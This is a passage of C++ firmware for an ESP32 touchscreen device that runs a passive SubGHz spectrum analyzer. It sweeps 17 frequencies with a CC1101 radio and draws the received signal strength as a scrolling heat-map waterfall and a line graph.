#define SA_ICON_NUM 4
static int saIconX[SA_ICON_NUM] = {130, 170, 210, 10};
static const unsigned char* saIcons[SA_ICON_NUM] = {
    bitmap_icon_power,             // 0: Start/Stop
    bitmap_icon_undo,              // 1: Clear/Reset
    bitmap_icon_antenna,           // 2: (reserved)
    bitmap_icon_go_back            // 3: Back
};

// Draw icon bar
static void drawAnalyzerUI() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);
    for (int i = 0; i < SA_ICON_NUM; i++) {
        tft.drawBitmap(saIconX[i], 20, saIcons[i], SA_ICON_SIZE, SA_ICON_SIZE, HALEHOUND_MAGENTA);
    }
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// FREQUENCY LIST — 17 SubGHz channels
// ═══════════════════════════════════════════════════════════════════════════

static const float frequencyListMHz[] = {
    300.000, 303.875, 304.250, 310.000, 315.000, 318.000,
    390.000, 418.000, 433.075, 433.420, 433.920, 434.420,
    434.775, 438.900, 868.350, 915.000, 925.000
};
static const int frequencyCount = sizeof(frequencyListMHz) / sizeof(frequencyListMHz[0]);

// ═══════════════════════════════════════════════════════════════════════════
// SDR-STYLE DISPLAY LAYOUT
// ═══════════════════════════════════════════════════════════════════════════
//
// ┌──────────────────────────────────────┐ y=0
// │ Status Bar                           │
// ├──────────────────────────────────────┤ y=20
// │ Icon Bar (Start/Stop, Clear, Back)   │
// ╞══════════════════════════════════════╡ y=37
// │                                      │
// │  SCROLLING HEAT MAP WATERFALL        │
// │  (150 rows of frequency vs time)     │
// │  Color: black→purple→blue→pink→white │
// │                                      │
// ├──── hot pink separator ──────────────┤ y=188
// │                                      │
// │  WAVEFORM LINE GRAPH                 │
// │  (current signal levels)             │
// │  Teal → Hot Pink gradient line       │
// │                                      │
// ├──────────────────────────────────────┤ y=268
// │ ─axis─  300      434      925  MHz   │
// ├──────────────────────────────────────┤ y=284
// │ Peak: 433.9MHz Lv:85  SCANNING       │
// │ Row: 42/150                          │
// └──────────────────────────────────────┘ y=319
//
// ═══════════════════════════════════════════════════════════════════════════

#define WF_X        2           // Left margin for drawing area
#define WF_Y        38          // Waterfall top (below icon bar + 1px gap)
#define WF_WIDTH_MAX 316               // Max drawing width for arrays (320 - 4 for landscape)
#define WF_WIDTH    (tft.width() - 4)  // Runtime drawing width (screen - 4px margins)
#define WF_HEIGHT   150         // Waterfall rows of history

#define SEP_Y       188         // Hot pink separator line

#define LG_Y        190         // Line graph top
#define LG_HEIGHT   78          // Line graph height (y=190 to y=267)

#define AXIS_Y      268         // X axis line position
#define LABEL_Y     271         // Frequency label text Y

#define STATUS_Y    284         // Status text area

// ═══════════════════════════════════════════════════════════════════════════
// DATA ARRAYS
// ═══════════════════════════════════════════════════════════════════════════

static uint8_t rssiLevels[17];          // Raw RSSI per freq (0-125)
static uint8_t peakLevels[17];          // Smoothed for display (0-125)

// Waterfall
static unsigned int epoch = 0;          // Current write row in waterfall

// Line graph (flicker-free erase/redraw)
static int16_t prevLineY[WF_WIDTH_MAX]; // Previous frame's Y positions (max size for any rotation)
static bool prevLineValid = false;       // False until first frame drawn

// Heat map palette (128 pre-computed 16-bit colors)
static uint16_t heatPalette[128];

// State
static bool initialized = false;
static bool exitRequested = false;
static bool scanning = true;
static unsigned long lastStatusDraw = 0;

// RSSI range for CC1101 — TIGHT range for SubGHz sensitivity
// Noise floor is ~-85dBm, strong close-range signal is ~-25dBm
// Wider range (-100 to -30) wastes 15dB below noise floor = dead display
static const int RSSI_FLOOR = -85;
static const int RSSI_CEIL = -25;

// ═══════════════════════════════════════════════════════════════════════════
// RSSI TO DISPLAY LEVEL (0-125)
// ═══════════════════════════════════════════════════════════════════════════

static uint8_t rssiToLevel(int rssi) {
    int clamped = constrain(rssi, RSSI_FLOOR, RSSI_CEIL);
    return (uint8_t)map(clamped, RSSI_FLOOR, RSSI_CEIL, 0, 125);
}

// ═══════════════════════════════════════════════════════════════════════════
// HEAT MAP PALETTE — HALEHOUND CYBERPUNK
// Black → Deep Purple → Electric Blue → Hot Pink → White
// Same color progression as PacketMonitor FFT waterfall
// ═══════════════════════════════════════════════════════════════════════════

static void initHeatPalette() {
    // Stage 1 (0-31): Black → Deep Purple (emerging from darkness)
    for (int i = 0; i < 32; i++) {
        byte r = (i * 15) / 31;     // 0 → 15
        byte g = 0;                  // Stay dark
        byte b = (i * 20) / 31;     // 0 → 20
        heatPalette[i] = (r << 11) | (g << 5) | b;
    }
    // Stage 2 (32-63): Deep Purple → Electric Blue (the glow begins)
    for (int i = 32; i < 64; i++) {
        int t = i - 32;
        byte r = 15 - (t * 15) / 31;    // 15 → 0 (fade red)
        byte g = (t * 31) / 31;          // 0 → 31 (cyan glow)
        byte b = 20 + (t * 11) / 31;    // 20 → 31 (max blue)
        heatPalette[i] = (r << 11) | (g << 5) | b;
    }
    // Stage 3 (64-95): Electric Blue → Hot Pink (MAXIMUM POP)
    for (int i = 64; i < 96; i++) {
        int t = i - 64;
        byte r = (t * 31) / 31;         // 0 → 31 (blast red)
        byte g = 31 - (t * 31) / 31;    // 31 → 0 (kill green)
        byte b = 31;                     // Stay max blue
        heatPalette[i] = (r << 11) | (g << 5) | b;
    }
    // Stage 4 (96-127): Hot Pink → White (blowout at peak intensity)
    for (int i = 96; i < 128; i++) {
        int t = i - 96;
        byte r = 31;                     // Max red
        byte g = (t * 63) / 31;         // 0 → 63 (add green for white)
        byte b = 31;                     // Max blue
        heatPalette[i] = (r << 11) | (g << 5) | b;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY BOOST — Noise gate + sqrt amplification for visual contrast
// Raw levels below 8 = noise floor → crushed to black
// Signals above 8 get sqrt boost: level 18→42, 50→82, 80→108
// ═══════════════════════════════════════════════════════════════════════════

#define NOISE_GATE 15       // Raw levels below this = hard cutoff
#define DISPLAY_THRESH 40   // Boosted levels below this = still black (kills noise floor color)

static uint8_t displayLevel(uint8_t raw) {
    if (raw < NOISE_GATE) return 0;
    float normalized = (float)(raw - NOISE_GATE) / (float)(125 - NOISE_GATE);
    uint8_t boosted = (uint8_t)(powf(normalized, 0.33f) * 125.0f);  // Cube root — fast color ramp
    if (boosted < DISPLAY_THRESH) return 0;  // Noise floor reads ~37 after boost → stays BLACK
    return boosted;
}

// ═══════════════════════════════════════════════════════════════════════════
// INTERPOLATION — Smooth 17 discrete frequencies to WF_WIDTH pixels
// ═══════════════════════════════════════════════════════════════════════════

static uint8_t interpolateLevel(int pixelX) {
    float freqPos = (float)pixelX * (frequencyCount - 1) / (float)(WF_WIDTH - 1);
    int idx = (int)freqPos;
    float frac = freqPos - idx;
    uint8_t raw;
    if (idx >= frequencyCount - 1) {
        raw = peakLevels[frequencyCount - 1];
    } else {
        raw = (uint8_t)((1.0f - frac) * peakLevels[idx] + frac * peakLevels[idx + 1]);
    }
    return displayLevel(raw);  // Noise gate + sqrt boost
}

// ═══════════════════════════════════════════════════════════════════════════
// WATERFALL ROW — One scan sweep → one pixel row (epoch-based, zero flicker)
// Each row is drawn pixel-by-pixel using heat map palette colors.
// The epoch wraps at WF_HEIGHT creating a continuous scrolling display.
// ═══════════════════════════════════════════════════════════════════════════

static void drawWaterfallRow() {
    int y = WF_Y + epoch;

    // Draw one row of heat-mapped pixels
    for (int x = 0; x < WF_WIDTH; x++) {
        uint8_t level = interpolateLevel(x);
        int palIdx = (level * 127) / 125;
        if (palIdx > 127) palIdx = 127;
        tft.drawPixel(WF_X + x, y, heatPalette[palIdx]);
    }

    // Clear the next row (creates subtle scan line cursor)
    int nextY = WF_Y + ((epoch + 1) % WF_HEIGHT);
    tft.drawFastHLine(WF_X, nextY, WF_WIDTH, TFT_BLACK);

    // Advance epoch (wraps at WF_HEIGHT)
    epoch = (epoch + 1) % WF_HEIGHT;
}

// ═══════════════════════════════════════════════════════════════════════════
// LINE GRAPH — Waveform display (teal→hot pink gradient, flicker-free)
//
// Uses erase-old/draw-new technique:
// 1. Draw over previous line segments in black (erase)
// 2. Compute new line Y positions from current signal levels
// 3. Draw new line segments with gradient color
// 4. Redraw axes (may have been partially erased)
//
// This avoids fillRect entirely — zero flicker on the line graph.
// ═══════════════════════════════════════════════════════════════════════════

static void drawLineGraph() {
    int16_t newLineY[WF_WIDTH_MAX];
    uint8_t newLevels[WF_WIDTH_MAX];  // Store display levels for color lookup

    // Phase 1: Erase previous line (draw over in black)
    if (prevLineValid) {
        for (int x = 1; x < WF_WIDTH; x++) {
            tft.drawLine(WF_X + x - 1, prevLineY[x - 1],
                         WF_X + x,     prevLineY[x], TFT_BLACK);
        }
    }

    // Phase 2: Compute new line Y positions + store levels
    for (int x = 0; x < WF_WIDTH; x++) {
        uint8_t level = interpolateLevel(x);
        newLevels[x] = level;
        int barH = ((int)level * (LG_HEIGHT - 1)) / 125;
        if (barH < 0) barH = 0;
        if (barH > LG_HEIGHT - 1) barH = LG_HEIGHT - 1;
        newLineY[x] = LG_Y + (LG_HEIGHT - 1) - barH;
    }

    // Phase 3: Draw new line — HEAT MAP PALETTE (matches waterfall colors)
    // No signal = dim gunmetal baseline, spikes light up purple→blue→pink→white
    for (int x = 1; x < WF_WIDTH; x++) {
        // Average the display levels of both endpoints for segment color
        int avgLevel = ((int)newLevels[x - 1] + (int)newLevels[x]) / 2;
        uint16_t color;
        if (avgLevel <= 0) {
            color = HALEHOUND_GUNMETAL;  // Dim baseline when no signal
        } else {
            int palIdx = (avgLevel * 127) / 125;
            if (palIdx > 127) palIdx = 127;
            color = heatPalette[palIdx];
        }
        tft.drawLine(WF_X + x - 1, newLineY[x - 1],
                     WF_X + x,     newLineY[x], color);
    }

    // Phase 4: Redraw axes (may have been partially erased by line)
    tft.drawFastHLine(WF_X, AXIS_Y, WF_WIDTH, HALEHOUND_MAGENTA);
    tft.drawFastVLine(WF_X - 1, LG_Y, LG_HEIGHT + 1, HALEHOUND_MAGENTA);

    // Save for next frame's erase
    memcpy(prevLineY, newLineY, sizeof(prevLineY));
    prevLineValid = true;
}

// ═══════════════════════════════════════════════════════════════════════════
// STATIC ELEMENTS — Drawn once on setup (axes, labels, separators)
// ═══════════════════════════════════════════════════════════════════════════

static void drawStaticElements() {
    // Hot pink separator between waterfall and line graph
    tft.drawFastHLine(0, SEP_Y, SCREEN_WIDTH, HALEHOUND_HOTPINK);

    // Line graph axes
    tft.drawFastHLine(WF_X, AXIS_Y, WF_WIDTH, HALEHOUND_MAGENTA);            // X axis
    tft.drawFastVLine(WF_X - 1, LG_Y, LG_HEIGHT + 1, HALEHOUND_MAGENTA);    // Y axis

    // Frequency labels below X axis
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(WF_X, LABEL_Y);
    tft.print("300");
    tft.setCursor(WF_X + WF_WIDTH / 2 - 10, LABEL_Y);
    tft.print("434");
    tft.setCursor(WF_X + WF_WIDTH - 20, LABEL_Y);
    tft.print("925");

    // "MHz" label on right side
    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(WF_X + WF_WIDTH - 5, LABEL_Y);
    // (space is tight, skip MHz label)
}

// ═══════════════════════════════════════════════════════════════════════════
// BATCH SCAN — All 17 frequencies in one pass (~8.5ms total)
// ═══════════════════════════════════════════════════════════════════════════

static void scanAllFrequencies() {
    for (int ch = 0; ch < frequencyCount && scanning && !exitRequested; ch++) {
        ELECHOUSE_cc1101.setMHZ(frequencyListMHz[ch]);
        ELECHOUSE_cc1101.SetRx();
        delayMicroseconds(800);  // Longer settle for accurate RSSI

        // Double RSSI read — OOK remotes pulse on/off, one read often catches "off"
        int rssi1 = ELECHOUSE_cc1101.getRssi();
        delayMicroseconds(300);
        int rssi2 = ELECHOUSE_cc1101.getRssi();
        int rssi = max(rssi1, rssi2);  // Take the stronger reading

        uint8_t level = rssiToLevel(rssi);
        rssiLevels[ch] = level;

        // Peak-hold smoothing: instant attack, slow 5% decay
        // Brief SubGHz bursts stay visible ~1 second as they fade
        if (level > peakLevels[ch]) {
            peakLevels[ch] = level;          // Instant attack
        } else {
            peakLevels[ch] = (peakLevels[ch] * 95) / 100;  // 5% decay per scan
        }
    }

    // Check touch for exit during scan
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty) && tx < 40 && ty >= 20 && ty <= 40) {
        exitRequested = true;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// STATUS AREA — Peak frequency + scan state
// ═══════════════════════════════════════════════════════════════════════════

static void drawStatusArea() {
    tft.fillRect(0, STATUS_Y, SCREEN_WIDTH, 36, TFT_BLACK);

    // Find peak frequency
    int peakIdx = 0;
    uint8_t peakVal = 0;
    for (int i = 0; i < frequencyCount; i++) {
        if (rssiLevels[i] > peakVal) {
            peakVal = rssiLevels[i];
            peakIdx = i;
        }
    }

    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(5, STATUS_Y + 2);
    tft.printf("Peak: %.1f MHz  Lv:%d", frequencyListMHz[peakIdx], peakVal);

    tft.setCursor(5, STATUS_Y + 14);
    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.printf("Row:%d/%d  %s", epoch, WF_HEIGHT,
        scanning ? "SCANNING" : "PAUSED");
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[ANALYZER] SubGHz SDR Display initializing...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawAnalyzerUI();

    // Deselect other SPI devices
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    // Reset SPI bus for CC1101
    SPI.end();
    delay(5);

    // Configure CC1101
    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);

    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setRxBW(812.5);  // Wide bandwidth for scanning
        ELECHOUSE_cc1101.SetRx();

        #if CYD_DEBUG
        Serial.println("[ANALYZER] CC1101 ready");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[ANALYZER] CC1101 not found!");
        #endif
        tft.setTextColor(TFT_RED);
        tft.setCursor(10, 100);
        tft.print("ERROR: CC1101 not found!");
        tft.setCursor(10, 115);
        tft.print("Check SPI wiring!");
        delay(2000);
    }

    // Initialize data arrays
    memset(rssiLevels, 0, sizeof(rssiLevels));
    memset(peakLevels, 0, sizeof(peakLevels));
    memset(prevLineY, 0, sizeof(prevLineY));
    prevLineValid = false;
    epoch = 0;
    lastStatusDraw = 0;

    // Build heat map palette
    initHeatPalette();

    // Reset state
    scanning = true;
    exitRequested = false;

    // Draw static UI elements
    drawStaticElements();

    initialized = true;

    #if CYD_DEBUG
    Serial.println("[ANALYZER] SDR display ready - 17 frequencies");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// LOOP
// ═══════════════════════════════════════════════════════════════════════════

void loop() {
    if (!initialized) return;

    // Update touch
    touchButtonsUpdate();

    // Icon bar touch handling
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= 20 && ty <= 36) {
                for (int i = 0; i < SA_ICON_NUM; i++) {
                    if (tx >= saIconX[i] && tx < saIconX[i] + SA_ICON_SIZE) {
                        lastIconTap = millis();
                        switch (i) {
                            case 0:  // Start/Stop scanning
                                if (scanning) stopScan();
                                else startScan();
                                break;
                            case 1:  // Clear / reset display
                                memset(peakLevels, 0, sizeof(peakLevels));
                                memset(rssiLevels, 0, sizeof(rssiLevels));
                                prevLineValid = false;
                                epoch = 0;
                                tft.fillRect(WF_X, WF_Y, WF_WIDTH, WF_HEIGHT, TFT_BLACK);
                                tft.fillRect(0, LG_Y, SCREEN_WIDTH, LG_HEIGHT, TFT_BLACK);
                                drawStaticElements();
                                break;
                            case 2:  // Reserved
                                break;
                            case 3:  // Back / exit
                                exitRequested = true;
                                return;
                        }
                        break;
                    }
                }
            }
        }
    }

    // Hardware button handling
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        exitRequested = true;
        return;
    }

    if (buttonPressed(BTN_SELECT)) {
        if (scanning) stopScan();
        else startScan();
        delay(200);
    }

    if (buttonPressed(BTN_DOWN)) {
        memset(peakLevels, 0, sizeof(peakLevels));
        memset(rssiLevels, 0, sizeof(rssiLevels));
        prevLineValid = false;
        epoch = 0;
        tft.fillRect(WF_X, WF_Y, WF_WIDTH, WF_HEIGHT, TFT_BLACK);
        tft.fillRect(0, LG_Y, SCREEN_WIDTH, LG_HEIGHT, TFT_BLACK);
        drawStaticElements();
        delay(200);
    }

    // Scan + draw (only when scanning)
    if (scanning) {
        scanAllFrequencies();    // ~8.5ms — read all 17 CC1101 channels
        drawWaterfallRow();      // ~3ms — draw one row of heat map
        drawLineGraph();         // ~7ms — erase old + draw new waveform
    }

    // Status area refresh every 200ms
    if (millis() - lastStatusDraw >= 200) {
        drawStatusArea();
        lastStatusDraw = millis();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SCAN CONTROL
// ═══════════════════════════════════════════════════════════════════════════

void startScan() {
    scanning = true;
    ELECHOUSE_cc1101.SetRx();

    #if CYD_DEBUG
    Serial.println("[ANALYZER] Scanning started");
    #endif
}

void stopScan() {
    scanning = false;
    ELECHOUSE_cc1101.setSidle();

    #if CYD_DEBUG
    Serial.println("[ANALYZER] Scanning stopped");
    #endif
}

bool isScanning() {
    return scanning;
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    scanning = false;
    ELECHOUSE_cc1101.setSidle();
    spiDeselect();

    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[ANALYZER] Cleanup complete");
    #endif
}

}  // namespace SubAnalyzer


// ═══════════════════════════════════════════════════════════════════════════
// SUBGHZ UTILITIES
// ═══════════════════════════════════════════════════════════════════════════

void cc1101Init() {
    // Deselect other SPI devices
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    // Reset SPI bus so ELECHOUSE can configure fresh
    SPI.end();
    delay(5);

    // Configure CC1101 SPI and GDO pins
    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);

    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setMHZ(433.92);
        ELECHOUSE_cc1101.SetRx();
        #if CYD_DEBUG
        Serial.println("[CC1101] Init complete - SPI18/19/23 CS27 GDO0=22 GDO2=35");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[CC1101] ERROR: Not detected!");
        #endif
    }
}

void cc1101Cleanup() {
    ELECHOUSE_cc1101.setSidle();
    spiDeselect();
}
